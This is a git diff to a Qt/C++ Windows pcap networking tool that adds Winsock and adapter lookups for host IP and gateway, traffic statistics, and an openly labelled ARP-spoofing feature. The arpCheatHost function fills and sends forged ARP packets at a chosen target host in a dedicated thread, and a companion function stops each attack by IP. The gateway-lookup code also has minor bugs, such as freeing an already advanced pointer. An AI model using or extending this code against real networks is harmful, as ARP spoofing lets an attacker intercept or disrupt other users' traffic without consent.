@@ -1,9 +1,11 @@
 #include "pcapcommon.h"
 #include <QThread>
-//#include <winsock.h>
+#include <windows.h>
+#include <winsock.h>
+#include <Iphlpapi.h>
 #include "getmacthread.h"
-#include "sendpacketthread.h"
 #include "receivepacketthread.h"
+#include "trafficstatistic.h"
 #include <QDebug>
 
 
@@ -17,11 +19,12 @@ PcapCommon::PcapCommon()
 
     //
     hostInfoBuffer = new QQueue< QPair<QString,QString> >;
+    sendThreadAdd = new QMap< QString,SendPacketThread* >;
 
     // 取数据定时器
     getDataFromQQueueTimer = new QTimer();
     connect(getDataFromQQueueTimer, SIGNAL(timeout()), this, SLOT(getDataFromQQueueTimerUpdateSlot()));
-    getDataFromQQueueTimer->start(1500);
+    getDataFromQQueueTimer->start(1000);
 }
 
 PcapCommon::~PcapCommon()
@@ -204,6 +207,126 @@ QString PcapCommon::getHostIp()
     return QString(hostInfo.ip);
 }
 
+// 获取Host IP(通过winsock2)
+QString PcapCommon::getHostIpByWinSock()
+{
+    char hostname[256] = {0};
+    WSADATA wsaData;
+    char ip[128] = {0};
+
+    // 调用Windows Sockets DLL
+    if (WSAStartup(MAKEWORD(2,1),&wsaData)){
+        printf("Winsock无法初始化!\n");
+        WSACleanup();
+        return 0;
+    }
+
+    if(gethostname(hostname, sizeof(hostname)) == 0){
+        // 结构
+        struct hostent * pHost;
+        pHost = gethostbyname(hostname);
+        //只取主网卡 ip
+        BYTE *p;
+        p =(BYTE *)pHost->h_addr;
+        sprintf(ip,"%d.%d.%d.%d", p[0], p[1],p[2], p[3]);
+    }
+
+    return QString(ip);
+}
+
+// 获取本机网关(通过winsock2)
+QString PcapCommon::getGateway()
+{
+    // PIP_ADAPTER_INFO结构体指针存储本机网卡信息
+    PIP_ADAPTER_INFO pIpAdapterInfo = new IP_ADAPTER_INFO();
+    // 得到结构体大小,用于GetAdaptersInfo参数
+    unsigned long stSize = sizeof(IP_ADAPTER_INFO);
+    // 调用GetAdaptersInfo函数,填充pIpAdapterInfo指针变量;其中stSize参数既是一个输入量也是一个输出量
+    int nRel = GetAdaptersInfo(pIpAdapterInfo,&stSize);
+    // 记录网卡数量
+    // int netCardNum = 0;
+    // 记录每张网卡上的IP地址数量
+    // int IPnumPerNetCard = 0;
+    if (ERROR_BUFFER_OVERFLOW == nRel){
+        // 如果函数返回的是ERROR_BUFFER_OVERFLOW
+        // 则说明GetAdaptersInfo参数传递的内存空间不够,同时其传出stSize,表示需要的空间大小
+        // 这也是说明为什么stSize既是一个输入量也是一个输出量
+        // 释放原来的内存空间
+        delete pIpAdapterInfo;
+        // 重新申请内存空间用来存储所有网卡信息
+        pIpAdapterInfo = (PIP_ADAPTER_INFO)new BYTE[stSize];
+        // 再次调用GetAdaptersInfo函数,填充pIpAdapterInfo指针变量
+        nRel=GetAdaptersInfo(pIpAdapterInfo,&stSize);
+    }
+    if (ERROR_SUCCESS == nRel){
+        // 输出网卡信息
+        //可能有多网卡,因此通过循环去判断
+        while (pIpAdapterInfo){
+            //cout<<"Net Card Num:"<<++netCardNum<<endl;
+            //cout<<"Net Card Name:"<<pIpAdapterInfo->AdapterName<<endl;
+            //cout<<"Net Card Dis:"<<pIpAdapterInfo->Description<<endl;
+            switch(pIpAdapterInfo->Type){
+            case MIB_IF_TYPE_OTHER:
+                //cout<<"Net Card Type:"<<"OTHER"<<endl;
+                break;
+            case MIB_IF_TYPE_ETHERNET:
+                //cout<<"Net Card Type:"<<"ETHERNET"<<endl;
+                break;
+            case MIB_IF_TYPE_TOKENRING:
+                //cout<<"Net Card Type:"<<"TOKENRING"<<endl;
+                break;
+            case MIB_IF_TYPE_FDDI:
+                //cout<<"Net Card Type:"<<"FDDI"<<endl;
+                break;
+            case MIB_IF_TYPE_PPP:
+                //printf("PP\n");
+                //cout<<"Net Card Type:"<<"PPP"<<endl;
+                break;
+            case MIB_IF_TYPE_LOOPBACK:
+                //cout<<"Net Card Type:"<<"LOOPBACK"<<endl;
+                break;
+            case MIB_IF_TYPE_SLIP:
+                //cout<<"Net Card Type:"<<"SLIP"<<endl;
+                break;
+            default:
+
+                break;
+            }
+            //cout<<"Net Card MAC Add:";
+            for (DWORD i = 0; i < pIpAdapterInfo->AddressLength; i++)
+                if (i < pIpAdapterInfo->AddressLength-1){
+                    //printf("%02X-", pIpAdapterInfo->Address[i]);
+                }
+                else{
+                    //printf("%02X\n", pIpAdapterInfo->Address[i]);
+                }
+                //cout<<"Net Card IP Add:"<<endl;
+                // 可能网卡有多IP,因此通过循环去判断
+                IP_ADDR_STRING *pIpAddrString =&(pIpAdapterInfo->IpAddressList);
+                do{
+                    //cout<<"The Net Card IP Num:"<<++IPnumPerNetCard<<endl;
+                    //cout<<"IP Add:"<<pIpAddrString->IpAddress.String<<endl;
+                    if(QString(pIpAddrString->IpAddress.String) == getHostIpByWinSock()){
+                        //qDebug()<< QString(pIpAddrString->IpAddress.String);
+                        return QString(pIpAdapterInfo->GatewayList.IpAddress.String);
+                    }
+                    //cout<<"NetMask:"<<pIpAddrString->IpMask.String<<endl;
+                    //cout<<"Gateway:"<<pIpAdapterInfo->GatewayList.IpAddress.String<<endl;
+                    pIpAddrString=pIpAddrString->Next;
+                } while (pIpAddrString);
+                pIpAdapterInfo = pIpAdapterInfo->Next;
+                //cout<<"--------------------------------------------------------------------"<<endl;
+        }
+
+    }
+    //释放内存空间
+    if (pIpAdapterInfo){
+        delete pIpAdapterInfo;
+    }
+
+    return "0.0.0.0";
+}
+
 // 获取Host Mac
 QString PcapCommon::getHostMac()
 {
@@ -259,6 +382,75 @@ void PcapCommon::scanLANHost(QString ipStart,QString ipEnd)
     recvScan->start();
 }
 
+// ARP欺骗指定主机
+void PcapCommon::arpCheatHost(QString cheatIp,QString cheatMac,QString gatewayMac)
+{
+    //qDebug()<< cheatIp << " " << cheatMac;
+
+    HostInfo cheatHostInfo;
+    memset(&cheatHostInfo,0,sizeof(HostInfo));
+    // 转化目标MAC
+    QStringList list1 = cheatMac.split("-");
+    for(int i = 0; i < list1.length(); ++i){
+        cheatHostInfo.mac[i] = hexStr2UChar(list1.at(i));
+    }
+    // 转化网关MAC
+    QStringList list2 = gatewayMac.split("-");
+    for(int i = 0; i < list2.length(); ++i){
+        cheatHostInfo.gatewayMac[i] = hexStr2UChar(list2.at(i));
+        hostInfo.gatewayMac[i] = hexStr2UChar(list2.at(i));
+    }
+    // 转换目标IP
+    QByteArray byteArray = cheatIp.toUtf8();
+    char * cstring = byteArray.data();
+    memcpy(cheatHostInfo.ip,cstring,cheatIp.length());
+    // 转换网关
+    QString gatewayIp = getGateway();
+    byteArray = gatewayIp.toUtf8();
+    cstring = byteArray.data();
+    memcpy(hostInfo.getwayIp,cstring,gatewayIp.length());
+    memcpy(cheatHostInfo.getwayIp,cstring,gatewayIp.length());
+
+    // 可New多个线程出来，防止抓包线程漏包
+    SendPacketThread *sendCheat = new SendPacketThread(handle,&hostInfo,
+                                                      ARP_PACKET_CHEAT,&cheatHostInfo);
+    // 保存线程地址，用以停止指定ARP攻击    
+    if(!sendThreadAdd->contains(cheatIp)){
+        sendThreadAdd->insert(sendCheat->getTheCheatHostIp(),sendCheat);
+    }
+
+    sendCheat->getArpPacket()->getEthernetPacket().fillEthernetHeader(hostInfo.mac,hostInfo.gatewayMac,ARP_TYPE);
+    sendCheat->getArpPacket()->fillArpPacket(ARP_HARDWARE,IP_TYPE,ARP_REQUEST,hostInfo.mac,cheatHostInfo.ip,hostInfo.gatewayMac,hostInfo.getwayIp);
+    sendCheat->getArpPacket()->setData();
+
+    sendCheat->start();
+}
+
+// 退出ARP Cheat Thread
+void PcapCommon::quitArpCheatThread(QString cheatIp)
+{
+    QMap< QString,SendPacketThread * >::const_iterator iterator = sendThreadAdd->begin();
+    while(iterator != sendThreadAdd->end()){
+        if(iterator.key() == cheatIp){
+            iterator.value()->quitThread();
+            sendThreadAdd->remove(cheatIp);
+            break;
+        }
+        ++iterator;
+    }
+}
+
+// 统计本机流量
+void PcapCommon::trafficStatistic(const char *dev)
+{
+    qDebug()<< "Start traffic statistic!";
+    TrafficStatistic * trafficStatistic = new TrafficStatistic(&hostInfo,dev);
+
+    connect(trafficStatistic,SIGNAL(trafficStatisticNetSpeedSig(QString)),this,SLOT(trafficStatisticNetSpeedSlot(QString)));
+
+    trafficStatistic->start();
+}
+
 u_char PcapCommon::hexStr2UChar(QString hexS)
 {
     QByteArray array = hexS.toUtf8();
@@ -305,4 +497,9 @@ void PcapCommon::getDataFromQQueueTimerUpdateSlot()
         info = hostInfoBuffer->dequeue();
         emit scanGetHostInfoSig(info);
     }
+}
+
+void PcapCommon::trafficStatisticNetSpeedSlot(QString netSpeed)
+{
+    emit trafficStatisticNetSpeedSig(netSpeed);
 }
